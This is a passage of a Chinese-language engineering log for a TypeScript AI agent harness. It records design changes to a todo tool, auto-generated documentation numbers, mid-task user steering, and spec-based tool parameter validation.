- **`tools/builtin.ts`**：注册第 7 个内置工具 `todo`。参数只传**增量**（`op` / `index` / `text`），**返回值就是渲染后带序号的整份清单**——模型下一轮自然看到最新进度，不必自己重抄。参数保持标量是刻意的：`spec.ts` 只给 5 种标量形状，且"清单本体住在工具的状态里"正是本设计的关键（状态与校验都收在 `TaskStore` 一处）。
- **`runtime/runtime.ts`**：删掉模块级 `loadTaskMemory()`（逐请求读文件 + 正则判定 + 全勾选即删）。注入 system 的 `task` 层改读 `taskStore.render()`；轮数预算与 `thinking auto` 改读 `taskStore.hasUnchecked()`；"全勾选即删"迁进 `projectToFile` / `loadFromFile`。
- **`harness/main.ts`**：启动时 `taskStore.loadFromFile('TASK.md')`，**一次性**把上一进程的投影吸收成种子。运行期一律以 store 为准、**不再回读文件**——否则就出现"两处判定"（store 与文件），迟早漂移，正是旧代码注释担心的"两处正则漂移"的同构病。
- **提示词/文案**：`core-section.ts` 的【工作记忆】教 `todo` 的三步用法；`agent-loop.ts` 收尾提示改口；`system-prompt.ts` 的 `hasUncheckedTask` 正则扩为 `\[[ >]\]`（认 `[>]` 进行中）。
- **验证**：新增 `verify-todo.ts` 50 项（store 语义 / **render-parse 互逆**（40 组随机状态属性测试）/ 两处"有没有未完成"的判定恒等 / 投影与种子 / 工具端到端 / 接线与源码防回退）；同步 `verify-c2`（16 → 14：清理用例迁走、改测 `[>]`）、`verify-spec`（45 → 46、工具数 6 → 7、基线 fixture 加 `todo`）、`verify-edit` / `verify-phase-ab` 各一处期望值。

**解决的问题**：
- 增量更新取代全量重抄：改一个勾只传 `op:done, index:N`，与 `edit` 的设计哲学对齐。
- 结构化取代正则：清单有顺序、有状态机、有"唯一进行中"不变量，护栏读到的不再只是一个布尔。
- 可校验取代可撒谎：`done` 走工具调用、进 `/traces` 与 `/history`，谎报完成会留痕；非法的 `op` / 越界的 `index` 由 `parse` 与工具直接拒成 `[INVALID]`。
- 单一真相源：`Log/` 的生成区早已用"写与查共用同一份模板（`syncText`）"解决过分家问题，`TASK.md` 的 `render`/`parse` 照抄这个手法——投影与种子是一对逆运算，重启不漂移。

**未来可优化**：投影文件路径目前硬编码为 `'TASK.md'`（cwd 相对），若要按会话分文件或多任务并行，得提成配置；清单只承载**步骤**（结构化），不含旧 `TASK.md` 的"目标 / 经验"散文——这是刻意的简化（见同日 DECISION_LOG），若日后确需，得为 store 设计一个可往返的字段而非回退到"模型写一段 blob"；`start/done` 的 `index` 缺省为 1（`optPosInt` 的默认值），"省略"与"显式传 1"不可区分，当前靠返回值回显"改了第几项"兜底，若要严格拒绝"省略"得新增标量形状。

---

<a id="log-2026-09-11-autogen"></a>
## 2026-09-11 14:14 | 文档数字从"手抄"改为"生成"：去重 + AUTOGEN 区块 + 只读校验

**牵连系统 / 层次**：文档纪律层（`Log/`：TESTING / ARCHITECTURE / 目录 / ROADMAP / GLOSSARY / 三份日志）· 验证与工具层（`scripts/`：新增 `autogen.mjs` / `collect-stats.mjs` / `docs-sync.mjs`，改 `run-verify.mjs` / `check-doc-numbers.mjs` / `verify-doc-numbers.ts`）· 命令入口（`package.json` 加 `docs:sync`）

**面向的问题**：
- 上一轮的 `check-doc-numbers.mjs` 能抓漂移，但**治的是症状**：它默认"同一事实就该被抄在多处"，于是把 23 处手抄都加进白名单看着。病根是**同一份事实被抄了 23 份** —— 加一套测试要人肉同步七八个数字，白名单自身也成了新负担。
- `ROADMAP` 的已完成表每行都写「全库 N 套 M 项」，逼得校验**特判"只认末行"**。那个特判本身就是设计味道：它不是快照，是穿着快照外衣的追加日志。
- 真要生成，还有一个前提问题：生成的数字从哪来？`run-verify` 手里的真值只活在它自己的进程里，`docs-sync` 拿不到。

**做出的改动**：
- **去重（L1）**：`ARCHITECTURE.md` 的测试行与债 5、`目录.md` 的职责表与 `scripts/` 树逐套项数、`ROADMAP.md` 已完成表末行，全部不再重述当前口径、改为引用 TESTING.md；`check-doc-numbers.mjs` 里对应的 `at()` 条目**整段删除**（含 ROADMAP 的末行特判），白名单 **23 → 11 处**。
- **真值下沉**：抽出 `scripts/collect-stats.mjs`（串跑 `^verify-*`、解析四种结果行变体、汇总套数 / 项数），`run-verify.mjs` 与 `docs-sync.mjs` **共用同一份** —— 否则"真值"会有两个版本，而真值分家正是这套机制要消灭的东西。
- **生成区（L2）**：`scripts/autogen.mjs` 定义 `RENDERERS`（id → 内容）与 `syncText()`（区段解析 + 渲染 + **只替换内容、保留前后空白**，故行内区段不会被撑成多行）。TESTING 的顶部 blockquote 与第二节各划一个区块（`test-summary` / `test-counts`）；`scripts/docs-sync.mjs` 跑完全套后按真值写入，**遇到结构问题就拒绝写盘**（标记不配对 / id 未知 / 一个区段都没有）—— 这时不该猜，也不该"尽力而为"地写一半。
- **校验侧**：`check-doc-numbers.mjs` 新增第 ④ 段，用**同一个 `syncText`** 算期望值再比文件内容；`run-verify.mjs` 只读、漂移计入退出码，并提示"生成区那几处可跑 `npm run docs:sync` 自动修"。
- **`package.json`** 加 `docs:sync`（工程化入口从三个变四个）。
- **ROADMAP 改判**：已完成表加表头注，声明「全库 N 套 M 项」是**该里程碑当时**的口径（历史记账），新行不再写全库口径。

**解决的问题**：
- 数字从此**不经过任何人的手**：加一套测试，要改的只有真值与手写散文，统计句由 `docs-sync` 渲染。实测本轮：手抄点 23 → 11 处，而生成区那两处在 `verify` 里**逐条点名**（「文件里是 X，应为 Y」）。
- **"改一次测试要同步七八个数字"降到"3 处手抄 + 1 条命令"**。
- 顺带改正一处旧叙事错数：TESTING 里 `verify-docs.mjs` 的"14 → 17"实为 **18**（+3 是新段，另 +1 是 ①② 统计的文档数从 6 涨到 7）。
- 特判消失：`ROADMAP` 不再需要"只认末行"，也就不必在改测试时回头改写历史行。

**未来可优化**：
- **L3 元数据下沉**：每个 `verify-*.ts` 自带 `name / scope`，连 TESTING 的套件表格（18 行手抄项数）都由它们生成 —— 那时手抄点会降到个位数。触发条件：套数继续增长（18 套手工维护得住，50 套不行）。
- **生成区推广**：目前只做了 TESTING 一份（试水）。§4「全量 N 套」与「.ts 的 N 套」、§7「N 项覆盖了什么」仍在白名单里 —— 它们是夹在句子中间的散句，划生成区会把句子切碎，故暂留。
- `ROADMAP_RULES.md` 描述的格式（`- **模块名** — 说明` 的列表、时间**倒序**）与 `ROADMAP.md` 的实况（表格、时间**升序**）**本来就对不上**，本轮未动；改判历史记账时也没顺手改规则书。

---

<a id="log-2026-09-11-doc-number-check"></a>
## 2026-09-11 13:19 | 文档里的数字第一次被机器看着：白名单式一致性校验 + 稳定锚点（显式 id）

**牵连系统 / 层次**：脚本层（新增 `scripts/check-doc-numbers.mjs`；`run-verify.mjs` 汇总后调用它并纳入退出码；`verify-docs.mjs` 的锚点集合从"标题 slug"扩成"slug ∪ 显式 id"并新增显式锚点卫生段；新增 `scripts/verify-doc-numbers.ts` 31 项）· 文档层（TESTING / 目录 / ARCHITECTURE / ROADMAP 四份快照的数字同步；三份追加日志各追加；`ARCHITECTURE_LOG_RULES.md` 增加"新条目带显式 id"的约定）· **未动**：`src/` 下一行代码、任何测试断言口径、任何文档的结构与分工

**面向的问题**：

- **数字纪律全靠人肉维持，这是整套文档体系里唯一没有机器兜底的地方。** `套数 / 项数` 在四份文档里各写一遍，**每一套的项数还在两处各列一遍**（TESTING 的套件表格、目录.md 的 scripts/ 树）。改一次测试要人肉同步七八个数字——而 `verify-docs.mjs` 只管锚点、**不管数字**。历史也证明它会漂：653 / 633 / 605 三个数字曾同时躺在不同文件里；本轮实测，一次小小的改动就制造了 **18 处漂移**，全靠机器才发现。
- **文档锚点会断，而断的那些修不了。** `verify-docs.mjs` 的锚点是 `f(标题文字)`，所以"链接不断"只能靠"标题文字不许改"——④ 段那 6 条契约就是这么来的。可那些标题在 append-only 的日志里，一旦有引用指着它，改标题就静默断链、而且**没法在源头修**（旧条目不该改写）。为了让机器能链接，人类散文被冻结了；引用粒度也粗到没法用（写出来是一串 30 字 CJK slug，所以只能写"同日 19:01 那块"这种模糊指代）。
- 顺带暴露一个**假绿**形状：若把锚点正则写窄、或把白名单漏一处，症状不是红，而是"那一处从此不再被扫到"——从"一致"悄悄变成"没人看"。

**做出的改动**：

1. **数字校验（`check-doc-numbers.mjs`）**。拆成纯函数 `diffDocNumbers(texts, actual)` 与 IO 包装 `checkDocNumbers(ROOT, actual)`——纯函数接受**合成文档**，所以用例可以在内存里造红，不必去改真仓库的文档。校验范围是**白名单**：TESTING 顶部 blockquote / 项数合计 / `.ts` 套数 / rpc-smoke 的"不计入 N" / 第四节"全量 N 套" / 第七节"N 项覆盖了什么"、ARCHITECTURE 的测试行与债 5、目录职责表、ROADMAP 已完成表**末行**，外加**两处逐套表格**（TESTING 与 目录.md）。
2. **接线（`run-verify.mjs`）**。在合计打印之后调用，传 `suites / tsSuites / total / rows`；漂移计入退出码，但**不计入 `totalPass`**——否则"总项数对不对"会取决于"有没有把校验自己算进去"，成了自指。名字用 `check-` 前缀，不匹配 `^verify-.+\.(ts|mjs)$`，所以不会被当成第 N 套重复跑。它只汇报一行：`文档数字：59 处一致。`
3. **稳定锚点（`verify-docs.mjs`）**。锚点集合从 `slugsOf` 扩成 `anchorsOf = slugs ∪ idsOf`，①② 两段解析两者都认；新增第 ③ 段「显式锚点卫生」（同一份文件里不重复、命名守 `log-<日期>-<短名>` 形状、且**非空**）；原 ③「入站锚点契约」顺延为 ④，并注明它只会变短不会变长。
4. **约定（`ARCHITECTURE_LOG_RULES.md`）**。从本条起，架构演进日志的新条目在 `##` 标题**上方**加一行 `<a id="…"></a>`，引用一律用这个 id。

**解决的问题**：

- **数字漂移从"人肉"变成"机器"**：本轮改完跑全量时，这条例校验一次性点名了 18 处（14 处总数/套数 + 2 处漏了新增套件 + 2 处 `verify-docs.mjs` 项数），一条不漏地给出了"写多少、实际多少"。这正是它存在的意义——今后忘改文档，`npm run verify` 会直接红。
- **锚点与文字解耦**：`<a id="log-2026-09-11-doc-number-check"></a>` 与标题怎么重述无关，引用短、纯 ASCII、且与 append-only 是同一种不变性（条目只追加不改写，所以 id 写一次就永不改）。**这层不变性此前隐含在标题文字里、靠人守；现在它是写下来的。**
- **堵掉一种假绿**：③ 段那条"确实扫到了显式 id（不是空集）"是专门加的反空转守卫——前两条若因为"一个都没扫到"而全绿，就是一条没有内容的检查。实测把它加进去时先红（当时确无 id），加上 id 后转绿。

**已知取舍**：

1. **白名单是唯一的正确做法，也是唯一的维护负担**。全库扫 `\d+ 套 / \d+ 项` 会命中追加日志与 ROADMAP 旧行里成片的历史数字——那些是**历史事实**（"当时全量 556 项"），改了才是篡改历史快照。所以只能枚举"写当前值"的位置。代价：**将来新增一处写当前值的地方，必须同时把它加进白名单**，否则那处不被查。这个代价用一条断言兜住——`verify-doc-numbers.ts` 的 D7 会对真 `Log/` 跑一次，确保白名单里每一处**还找得到**（文案被改写时它会红）。
2. **逐套比对用的是"通过数"而不是"项数"**。全绿时两者相等；某套有失败时，会先报到"文档写 8、实际 7"——这是对的（文档描述的是绿状态），但也意味着**有失败时数字校验会跟着红**，两条信号重叠。可以接受：失败本来就要先修。
3. **旧的 6 条标题文字契约保留、不迁移**。给 900+ 行旧日志补 id，性质上是"改写历史条目"，与本仓库纪律冲突。所以只从新条目开始带 id，纯增量、不回头动历史。
4. **校验自身不计入项数**——它是"检查文档的检查"，算进去就自指。

**未来可优化**：

- 若哪天真要收敛 ③④ 两段，可以做成"所有被引用的锚点（含标题 slug）都必须存在"，再看旧引用是否值得迁到显式 id 上——但那需要一次性重写历史条目的标题或补 id，代价大于收益，暂不做。
- 白名单可以再往前一步：把"哪些位置该有当前值"也变成数据（例如一份 `docs-numbers.json` 清单），让新增文档时不必改代码。现在三处正则已经够用，且代码里的注释比配置文件更好读。

## 2026-09-10 19:32 | 内层引导从"不落历史"变成"落盘 + 适配器同角色归并"：债 11 关闭，且它的一半前提被核查推翻

**牵连系统 / 层次**：LLM 协议层（llm/anthropic.ts 的 `toAnthropicMessages` user 分支 + 函数头注释）· 运行时编排层（runtime.ts 新增 `STEER_PREFIX` 常量、`runSingleTurn` 落盘、`getHistoryMessages` 增 `steer` 标记；core/loop.ts 与 loop/agent-loop.ts 的取舍注释改写）· 命令层（commands/builtin/history.ts 的 `labelOf` / `summarize`）· 文档层（ARCHITECTURE 第四节第 9、11 条与表头计数、GLOSSARY 的 Steering 词条、TESTING / 目录 / ROADMAP / CHANGE_LOG / DECISION_LOG 与本文件）· 验证层（`verify-steering.ts` 28 → 48 项；`verify-session.ts` C1/C2 改口径）

**面向的问题**：内层引导（本文件同日 19:01 那块）落地后立刻暴露两个缺口。① 引导文本只活在本次请求的 `toolMessages` 里——`/history` 看不到它，下一次请求的历史也没有它，模型下一轮只知道"最终答案是什么"，不知道用户中途改过方向。② 登记为债 11 时给的理由是"连续两条 user → 400"，而这条**前提从未被核实过**。

**做出的改动**：

1. **先核查前提**（因为它决定措辞与修法）：Anthropic API 参考对 `messages` 参数的原话是 `Consecutive user or assistant turns in your request will be combined into a single turn.`（`docs.anthropic.com` 的 en / fr 两版、`console.anthropic.com`、`platform.claude.com` 的 csharp / cli 两版——5 个镜像逐字一致）；而第三方"roles must alternate"的 400 报告也大量存在（含一篇标注 Verified 2026-04）。两种说法不可能同时严格成立，且**本机无法裁定**：官方站点在此网络返回 `app-unavailable-in-region`，也没有 key 可实测。另查明真正硬的 Anthropic 规则是 `tool_use` 必须紧跟配对的 `tool_result`——那条没有任何自动合并能救，多数 400 疑为把它误读成"角色交替"。
2. **落盘**：`runSingleTurn` 加一个本轮缓冲，`takeSteer` 回调把取到的引导同时记进去；在 `appendMessage('assistant', finalText)` **之前**按序 `appendMessage('user', STEER_PREFIX + steer)`。位置是关键——引导发生在"用户提问"与"助手回复"之间，落在 assistant 之后就是错的时序。
3. **归并**：`toAnthropicMessages` 的 `user` 分支从**无条件 push** 改成**能并则并**（上一条已是 user 就把文本块并进去），与它本来就在做的连续 tool 结果合并同层、同一手法。
4. **可见**：`STEER_PREFIX`（`[用户引导] `）作为唯一标记通道，`getHistoryMessages()` 据此增返回 `steer: boolean`，`/history` 用 `⚡ 中途引导` 单独标记，并在摘要时剥掉前缀。
5. **修正一条断言口径**：`verify-session.ts` 的 C1/C2 原本裸扫 runtime.ts 数 `appendMessage(` 出现几次，被顶部 `STEER_PREFIX` 的 JSDoc 里那句**引用**误伤。按 TESTING 第八节的"先切段"口径改成只在 `runSingleTurn` 方法体内数，期望从 2 改到 3。

**解决的问题**：

- 债 11 关闭：引导既进本轮上下文（19:01 那块），也进会话历史（`/history` 与后续请求都看得到）。
- 顺手堵掉 `toAnthropicMessages` user 分支的"无条件 push"——它此前**不可达**（内部格式从未产出连续 user），落盘后才会被踩到，所以两件事必须同轮做。
- 一个未证实的前提从"确定事实"降级为"未证实但不应依赖"，修法则与它**解耦**（本地归并是幂等的：服务端本会合并时无害、真拒绝时救命，两种世界里都对）。

**已知取舍**：

1. **序列只归一化在 Anthropic 一条线上**。落盘后 OpenAI 兼容路径会真的发出连续两条 user（该路径原样透传、零归一化）。标准 OpenAI 语义容忍它，故风险低，但这是本方案唯一无法替服务端担保的地方——已用 S10 把这一不对称钉成断言，而不是埋在注释里。
2. **标记走内容前缀而不是结构化字段**。给 `MessageEntry` 加 `steer?` 看起来更正规，但 `session/in-memory.ts` 与 `mock.ts` 的 `appendMessage(role, content)` 不接第三个参数，extra 会被静默丢弃，等于重演债 9 的病。代价是 `/history` 依赖一个字符串约定（已收在 `STEER_PREFIX` 一处，不散落），换来三个后端行为一致。
3. **引导仍不 abort 在飞的流**。半截 `tool_call` 不可执行、已跑过的 `bash` 副作用不可撤销、部分输出的 assistant 留下就没有配对的 tool 结果——三样无解，【预留】不变。

**未来可优化**：

- 若哪天确认 Anthropic 确实会做服务端合并，适配器那道归并可以退化成"仅作说明"的注释；反之若 OpenAI 兼容侧也出现严格端点，把归并上提到 runtime 历史映射处即可（一处护住所有供应商）。
- 引导只在"被内层吸收"时走本条落盘路径；被外层兜底消费的那些本来就是独立回合、天然落盘，两条路形状一致，无需额外处理。

## 2026-09-10 19:01 | 引导（steering）的消费点从“外层循环”下沉到“内层工具边界”：用户执行中途插入的话第一次进**本轮**上下文

**牵连系统 / 层次**：契约层（`core/loop.ts` 的 `AgentLoopOptions` 加**可选**成员 `takeSteer?: () => string | null`）· Agent Loop 子系统（`loop/agent-loop.ts` 新增 ④ 段取件与寄生注入，原 ④/⑤ 顺延为 ⑤/⑥）· Runtime（`runtime.ts`：`agentLoop.run()` 传接线、入队提示文案改写、`steerQueue` 与两处出队点的注释重写为“先内后外”的两级消费模型）· 验证层（新增 `scripts/verify-steering.ts` 28 项）· 文档层（TESTING / 目录 / ARCHITECTURE / GLOSSARY 四份快照同步到 17 套 633 项、GLOSSARY 新增 Steering 词条、DECISION_LOG 记一条三选一、ROADMAP 已完成表补一行、ARCHITECTURE 架构债新增第 11 条）。**未动**：`core/tools.ts`、permission 子系统、任何工具、**事件类型**（复用现成的 `thinking/analyzing`，UI 侧一行未改）

**面向的问题**：
- **`steerQueue` 名不副实。** 改前它只有两个出队点，都在 Runtime 外层 `while(true)` 里（`prompt` 轮首、`runSingleTurn` 返回之后），而 `AgentLoop` 的 `for (let turn...)` 工具循环里**一处队列检查都没有**。后果：用户看着 Agent 在调工具、说“别这么干了”，这句话要等**整轮工具循环全部跑完**才被读到。于是 steer 与 followUp 的实质差别只剩**优先级**，不是吸收时机——名字许了一个没兑现的承诺
- **收益在这一侧，不在 abort 那一侧。** 模型“走错方向”这件事，恰好只在跑完一两个工具之后才看得出来，而那一刻正是内层边界。真·硬打断（abort 在飞的 `fetch`）要面对三件无解的事：半个 `tool_call` 的 JSON **不可执行**、已跑过的 `bash` **副作用无法撤销**、部分输出的 assistant 消息留下就没有配对的 tool 结果（协议不合法）——所以仍留在【预留】，先做改动小、无协议风险的内层吸收

**做出的改动**：
- **契约**：`AgentLoopOptions` 加**可选**成员 `takeSteer?`（可选的理由与 `ToolDefinition.parse?` / `ToolProvider.permissionKey?` 同一手法：加必需成员会打坏既有替身）。注释里把两条语义边界写死，由实现侧负责——调用方只需给一个“取一条，没有返回 null”的函数
- **实现**（`agent-loop.ts` ④ 段）：工具执行完、下一次 `llm.stream()` 之前取件，把文本**追加进最后一条 tool 结果的 content**，前缀一行 `[用户引导] 用户在你执行过程中插入了新指示，优先级高于当前步骤，必要时放弃当前方向：`
- **两条“不吞消息”护栏**（各有独立断言，且都做过变异测试）：① 只在 `turn < maxTurns - 1` 时取件——最后一轮取走会**无人消费**（本轮之后没有 LLM 调用了），既不进上下文也不再回队；② 只在**本轮产出过工具调用**时取件——没有工具就没有注入落点（循环在 ② 段就 break 了），留给外层循环当新回合
- **Runtime 接线**：`takeSteer: () => { const s = this.dequeueSteer(); if (s) this.events.emit({ type: 'thinking', phase: 'analyzing' }); return s; }`——内层吸收同样是“模型要重新生成”的信号，UI 的封框/状态行已有现成分支，不必为新机制加事件类型

**解决的问题**：
- 用户在工具执行期间插入的指示**当轮生效**。端到端实测（`verify-steering.ts` S6）：3 次 LLM 往返之内就把它送达模型；而**摘掉接线后立刻变成 4 次**——多出来的那一次就是“退回外层当新回合”的成本，也正是 ② 与 ③ 之间的全部差别
- steer 与 followUp 从此有了**真实**的机制差别，不再只是同一落点上的优先级
- 入队提示文案同步改写：`（消息已插入，当前回复完成后立即处理）` → `（已插入，当前步骤结束后立即采纳）`（前者在内层吸收落地后已经不成立）

**已知取舍（刻意不做，已登记为架构债第 11 条）**：
- **引导文本不落会话历史**（`/history` 看不到它）。落盘会造出 `user,user,assistant` 的会话序列，下次请求映射历史时又是连续两条 user → Anthropic 直接 400（`toAnthropicMessages` 的 `user` 分支**无条件** push，不像 tool 结果那样合并）。要持久化得先在历史映射处做一遍同角色合并，属另一件事
- **不能新开一条 user 消息**：tool 结果在 `anthropic.ts` 里已转成 user 角色，跟在它后面的 user 就是连续两条 user。这与既有的重复失败提示 / 收尾提示是同一个手法、同一条理由

**未来可优化**：内层引导暂不参与“重复失败保护”计数器（引导是**换方向**，不是重试同一调用，混进同一个计数器会污染“同一调用连续失败”的语义）；硬打断仍需 `llm.stream()` 支持 `AbortSignal`，且要先解决半截 `tool_call` 与工具副作用的善后

---

## 2026-09-06 10:44 | 工具参数从“两份手写副本”收敛成“一份 spec 派生三样”：发给模型的 Schema 第一次成为契约

**牵连系统 / 层次**：工具子系统（新增 `tools/spec.ts`；`tools/builtin.ts` 的 6 个工具全改走 `defineTool()`、删掉 4 个校验件共 18 处；`tools/registry.ts` 的 `execute()` 从 3 行变成“先 parse 再 handler”）· 契约层（`core/tools.ts` 的 `ToolDefinition` 加第三个**可选**成员 `parse?`；`ToolProvider` 本轮**未动**）· 验证层（新增 `verify-spec.ts` 45 项 + `fixtures/tool-schemas-baseline.json` 基线快照；`verify-edit.ts` / `verify-permission.ts` 两处段头的替身计数 7 → 9）· 文档层（TESTING / 目录 / ARCHITECTURE / GLOSSARY 四份快照同步到 16 套 605 项、GLOSSARY 新增 spec / defineTool / ToolInputError 三个词条、DECISION_LOG 记一条三选一、ROADMAP 关掉 P6 “工具参数校验框架”待办）。**未动**：`loop/agent-loop.ts` 的前缀分类与判定式、任何工具的返回前缀、任何错误文案（逐字未变，③ 段钉着）、permission 子系统——`[INVALID]` 这个信号本身是 09-05 那轮建好的，本轮只是让它**真的能被触发**

**面向的问题**：
- **同一套参数规则写了两遍，且没有任何机制保证一致**：① `builtin.ts` 里 6 份手打 JSON Schema（序列化后发给模型）② 14 处校验件调用 + 1 处手写 boolean 强转（工具层拿到 args 自己再查一遍）。两者之间唯一的纽带是**人手把同一个词打了多遍**：`grep` 的 `'pattern'` 在这一个工具里出现 7 次（4 处是协议性的：文案 1、属性名 1、字符串字面量 2），而 TS 一处都不检查（校验件的 key 形参类型是 `string`，什么都能塞）。写成 `'patern'` 编译通过、测试不红，只在运行时让模型收到一句“patern 是必填参数”，而它手上的单子写的是 pattern
- **那份 Schema 改前的身份是“给模型的建议书”，不是契约**（实测，不是推导）：`registry.execute()` 只有 3 行，`tool.parameters` 一个字段都没读。造一个 `required: ['mustHave']` 的工具，①什么都不传 ②传一个对象 ③传 Schema 里根本不存在的参数名——三次全部返回 `[OK]`。所以收敛要做的不只是“让两处一致”，而是**让那份单子第一次真正生效**
- **`String(val)` 是一个永远通过的校验**：`requireString` 里那句 `const str = String(val)` 让 `123` / `{a:1}` / `['src']` / `true` 全部过关，被强转成 `"123"` / `"[object Object]"` / `"src"` / `"true"`，然后在**文件系统层**才失败并报 `[NOT_FOUND]` / `[NOT_FILE]`。模型收到“路径不存在”而真因是它传了个数字 → 它会开始猜路径。**与 09-04 那个 grep bug 同构**（都是“错误被算成了正常答案”），区别是那次错在前缀选择，这次错在校验根本没发生
- **多余参数静默忽略**：`{pattern:'x', pathh:'typo'}` 让 `path` 退回默认 `'.'`，搜完整个项目还报 `[OK]`——模型以为自己在搜指定目录，实际搜的是全库
- **上一轮把“参数写错”接进了重复失败保护，但那条链路对“类型不对”和“参数名写错”两类完全不响**：它们根本走不到 `[INVALID]`，而是走到 `[NOT_FOUND]`（不计失败的有效否定）或静默 `[OK]`（成功）。09-05 修的是消费侧的名单，本轮修的是生产侧根本没把这两类归到 `[INVALID]` 里

**做出的改动**：
- **一份定义派生三样**：`toJsonSchema(spec)` → 发给 LLM 的 `parameters`；`parseSpec(spec, args)` → 运行时审核并补齐默认值；`Infer<typeof spec>` → handler 的入参类型（“撬参数”这个动作本身消失）。“同源”用**对照组**钉住（1-6~1-8b：只改 spec 里 `age` 一个键，两个派生物必须**同时**跟着变），否则它可以被实现成“两份各自硬编码但恰好一致”而全绿——那正是改造前的病
- **五个构造器、刻意不做四件事**：`str` / `strAllowEmpty`（必填但允许空串，`edit` 的 `newText` 空串 = 删掉这一段）/ `optStr` / `optPosInt` / `optBool` 覆盖现有 16 个字段；不做跨字段约束、不做嵌套对象、不做 union、不做自定义 refine。也不引 Zod / TypeBox（表达力用不到十分之一，而 `zodToJsonSchema` 是座**有损**的桥，三选一记在 DECISION_LOG）
- **`execute()` 的失败语义分两边**：`ToolInputError` 就地转成 `[INVALID] 文案`（那是模型的错，得让它看见并改正），**别的异常一律 `throw` 穿透**（规格自己写坏了不是模型的错，报成“参数不合法”会让它去改一个没写错的参数）
- **`parse` 做成可选成员，且注释里的理由是行为面的而不是编译面的**：本轮实测把它改成必需，`tsc --noEmit` 仍 0 错——全项目只有 `defineTool` 一处构造 `ToolDefinition`（6 个内置工具全走它），而 `scripts/` 下 9 处替身实现的是 `ToolProvider`（`parse` 不在这个接口上）、且 `tsconfig` 的 include 只列了 src 一个目录。早先 `core/tools.ts` 里写的“必需成员会打坏 7 处替身”是从 `permissionKey` 那轮抄来的，对 `parse` 不成立，已连同数字（7 → 9）一起改
- **全项目唯一一次类型收窄留在 `defineTool` 里那一行 `as`**：`core/tools.ts` 的 handler 契约仍是 `Record<string, unknown>`。跟着泛型化就得给 `ToolDefinition` 加类型参数，而它是三个文件的公共词汇（core 的接口与 `ToolProvider.register` 入参、`registry.ts` 那个 Map 的值类型、`spec.ts` 的返回类型），改一处要跟改三处，换来的只是省掉一行 `as`。收窄的正确性靠“execute 一定先跑 parse 再跑 handler”保证，⑥ 段钉的就是这条接线
- **`permissionKey` / `permissionDetail` 刻意不跟着泛型化**：权限确认发生在 `agent-loop` 调 `execute` **之前**，那时参数还没校验过，它们拿的仍是未经 parse 的原始 args。`edit` 的 permissionDetail 里那句 `String(args.replaceAll)` 因此消不掉——5-5 不假装它不存在，而是先切段再分开钉“handler 区 0 处 / permissionDetail 区 1 处”
- **护栏用机器导出的基线，不用手打的期望值**：`scripts/fixtures/tool-schemas-baseline.json` 是改造**前**跑一次导出的 6 份 parameters 快照，④ 段按 `JSON.stringify` 逐字比对。它是先行断言里**应当全绿**的那一段（钉的是“收敛源头不许顺手改契约”），与 ①②③⑤⑥ 先红后绿的先行段刻意分开

**解决的问题**：
- 参数名在源码里只剩 spec 里那一处：`grep` 段里 `'pattern'` 的协议性副本 3 → 1，4 个校验件（定义+调用共 18 处）从 `builtin.ts` 整体消失，写错参数名从此**编译就红**（它现在只以属性名形式存在）
- 四个类型盲区全堵（`coerce` 是全项目唯一做参数类型判断的地方），多余参数从“静默忽略”变成“拒并列出可用参数名”——后者是 `'patern'` 那类拼写错误唯一能被当场纠正的机会
- 09-05 那条链路接上了：参数错误现在真的能走到 `[INVALID]` → 计入失败 → 连错两次注入 `[系统提示]`。在那之前它对“类型不对”与“参数名写错”两类完全不响

**未来可优化**：
- **结构化返回值仍未做**：09-05 那块写“彻底的做法是让 handler 返回结构化结果（`{ status: 'ok' | 'invalid' | 'not_found' | 'error' }` + 文本），那是工具参数校验框架那一步的事”——本轮就是那一步，但只兑现了参数校验这一半：handler 仍返回字符串，前缀仍是工具层与消费层之间唯一的协议，加一个新前缀仍要靠人记得改 agent-loop 的名单。但本轮把参数层的入口收成了一处（`coerce`），要做结构化返回，“参数不合法”这一类已经有唯一的生产点了
- **`parse` 是可选成员 → 绕过是合法的**：手写一个不走 `defineTool` 的 `ToolDefinition` 就没有任何校验，编译期不拦（实测改成必需也拦不住，理由见上）。现在的防线是 ⑤/⑥ 段的源码断言，属**手段断言**，改写措辞会误报
- **spec 的形状是穷举的**：要“数组参数”或“路径必须存在”就得改框架文件（加构造器 + 加 `coerce` 分支 + 加断言）。刻意如此（不做通用表达力就不长死代码），但代价是这类需求的改动点在 `spec.ts` 而不在工具里
- **两处宽容没有到期机制**：数字字段接受数字字符串、布尔字段接受 `'true'` / `'false'`（模型常这么传）。哪天模型不再这么传，`coerce` 里那两条分支就是死代码，而现在没有任何东西会把这件事说出来
- **本轮自己踩的方法论坑：源码文本断言的口径得自己划**（5-5）。数 `String(args.replaceAll)` 期望 1、实测 2，多出的那处是 `builtin.ts` 顶部注释里**逐字引用这句代码**的散文（而它引用的目的正是解释“这处为什么消不掉”）。先加的“剔掉整行注释”只解决了一半：块注释里**折行的续行**既不以 `*` 也不以 `//` 开头，照样漏网；最终解法与 `verify-tools.ts` ⑦ 段同一手法——先切段再断言。这是本项目**第三次**踩同一个坑（前两次在 verify-edit / verify-tools），已写进 TESTING.md 第三节
- **同一轮里重演了 09-05 记下的那个坑**：修 GLOSSARY 一个错字时，把 `original_text` 与 `new_text` 写成了完全相同的文本，工具返回 success 但**什么也没改**（全靠写完回读 diff 才发现）；本轮新写的文档里又出了三个形近字（“跳字段”应为“跨字段”、“纯正”应为“纠正”、“框框架”），全部靠回读 diff 抓到——“不能信工具返回的 success”这条仍然只能靠人执行

---

## 2026-09-05 21:42 | 失败分类从“两类进判定式”改成“三类写清、两类进判定式”：[INVALID] 归入计失败的一侧

**牵连系统 / 层次**：Agent Loop 子系统（loop/agent-loop.ts：`failed` 判定式加第三个前缀 + 上方注释从两类扩成三类）· 事件契约层（runtime/events.ts 的 `ok` 字段注释）· 工具子系统（tools/builtin.ts 的 edit 承重注释：原第 1 行理由已变，精确化而非删除）· 验证层（verify-phase-ab.ts 新增 A4/A5 共 4 项 13 → 17；verify-tools.ts 的 E11 与 verify-edit.ts 的 C4 两条**源码文本断言**判定式升级）· 文档层（GLOSSARY 的 grep 词条与前缀表、TESTING / 目录 / ARCHITECTURE 三份快照同步到 15 套 560 项、DECISION_LOG 记一条二选一、ROADMAP 已完成表补一行）。**未动**：core/tools.ts 的契约、任何工具的返回前缀、提示文案——全库 12 处 `[INVALID]` 一个字没改，改的是消费侧怎么读它

**面向的问题**：
